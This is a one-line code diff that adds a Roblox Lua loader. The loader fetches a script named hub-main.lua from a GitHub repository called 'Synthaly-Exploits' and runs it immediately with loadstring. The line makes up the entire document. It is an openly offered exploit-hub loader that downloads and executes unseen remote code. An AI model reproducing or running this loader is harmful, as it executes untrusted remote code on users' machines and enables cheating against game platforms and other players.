@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://github.com/SynthalyUS/Synthaly-Exploits/raw/main/hub-main.lua"))();
